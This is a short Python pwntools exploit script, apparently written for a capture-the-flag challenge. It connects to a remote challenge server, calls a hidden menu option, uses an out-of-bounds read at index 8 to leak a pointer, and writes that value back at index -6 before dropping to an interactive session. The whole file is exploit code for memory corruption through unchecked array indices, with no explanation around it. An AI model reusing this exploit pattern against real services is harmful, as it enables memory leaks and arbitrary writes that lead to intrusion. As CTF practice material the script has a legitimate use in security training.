#!/usr/bin/env python3
from pwn import *

exe = ELF("./index-2_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
else:
    p = remote("play.scriptsorcerers.xyz", 10096)

def read_data(idx):
    p.sendlineafter(b'4. Exit', b'2')
    p.sendlineafter(b'Index: ', idx)

def store_data(idx, data):
    p.sendlineafter(b'4. Exit', b'1')
    p.sendlineafter(b'Index: ', idx)
    p.sendlineafter(b'Data: ', data)


input()
p.sendlineafter(b'4. Exit', b'1337')

#leak exe
read_data(b'8')
p.recvuntil(b'Data: ')
leak = u64(p.recv(6) + b'\0\0')
log.info("io_file: " + hex(leak))

store_data(b'-6', p64(leak))

p.interactive()
